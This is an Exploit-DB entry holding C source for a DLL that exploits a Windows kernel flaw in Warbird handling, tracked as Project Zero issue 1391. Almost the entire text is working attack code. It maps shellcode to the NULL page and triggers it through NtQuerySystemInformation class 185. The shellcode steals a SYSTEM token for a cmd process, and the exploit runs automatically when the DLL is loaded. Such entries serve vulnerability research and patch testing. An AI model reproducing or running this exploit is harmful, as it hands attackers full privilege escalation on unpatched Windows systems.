/* 
  EDB Note
  Source ~ https://gist.github.com/xpn/736daa4d1ff7b9869f4b3d1e9a34d315/ff2e2465d4a07588d0148dc87e77b17b41ef9d1d
  Source ~ https://blog.xpnsec.com/windows-warbird-privesc/
  Source ~ https://github.com/xpn/warbird_exploit
  Ref ~ https://bugs.chromium.org/p/project-zero/issues/detail?id=1391
*/

    // Shellcode to be executed by exploit
    const char shellcode[256] = {
	0xc7, 0x43, 0x04, 0x00, 0x00, 0x00, 0x00, 0x81, 0xc4, 0x0c,
	0x00, 0x00, 0x00, 0x81, 0xc4, 0x04, 0x00, 0x00, 0x00, 0x5f,
	0x5e, 0x5b, 0x89, 0xec, 0x5d, 0x81, 0xc4, 0x0c, 0x00, 0x00,
	0x00, 0x81, 0xc4, 0x04, 0x00, 0x00, 0x00, 0x5e, 0x5b, 0x5f,
	0x89, 0xec, 0x5d, 0x81, 0xc4, 0x04, 0x00, 0x00, 0x00, 0x81,
	0xc4, 0x04, 0x00, 0x00, 0x00, 0x5f, 0x5e, 0x5b, 0x89, 0xec,
	0x5d, 0x81, 0xc4, 0x04, 0x00, 0x00, 0x00, 0x81, 0xc4, 0x04,
	0x00, 0x00, 0x00, 0x5f, 0x5f, 0x5e, 0x5b, 0x89, 0xec, 0x5d,
	0x60, 0x64, 0xa1, 0x24, 0x01, 0x00, 0x00, 0xc7, 0x80, 0x3e,
	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x80, 0xe8,
	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x80, 0xec,
	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x80, 0xf0,
	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x80, 0xf4,
	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x80, 0xf8,
	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x80, 0xfc,
	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8b, 0x80, 0x50,
	0x01, 0x00, 0x00, 0x81, 0xb8, 0x7c, 0x01, 0x00, 0x00, 0x63,
	0x6d, 0x64, 0x2e, 0x74, 0x0d, 0x8b, 0x80, 0xb8, 0x00, 0x00,
	0x00, 0x2d, 0xb8, 0x00, 0x00, 0x00, 0xeb, 0xe7, 0x89, 0xc3,
	0x81, 0xb8, 0xb4, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
	0x74, 0x0d, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x2d, 0xb8,
	0x00, 0x00, 0x00, 0xeb, 0xe7, 0x8b, 0x88, 0xfc, 0x00, 0x00,
	0x00, 0x89, 0x8b, 0xfc, 0x00, 0x00, 0x00, 0x61, 0xc3, 0xff,
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff
    };

void exploit(void) {
	BYTE Buffer[8];
	DWORD BytesReturned;
    
	RtlZeroMemory(Buffer, sizeof(Buffer));
	NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)185, Buffer, sizeof(Buffer), &BytesReturned);
    
	// Copy our shellcode to the NULL page
	RtlCopyMemory(NULL, shellcode, 256);
    
	RtlZeroMemory(Buffer, sizeof(Buffer));
	NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)185, Buffer, sizeof(Buffer), &BytesReturned);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					             )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		exploit();
		break;
	}
	return TRUE;
}
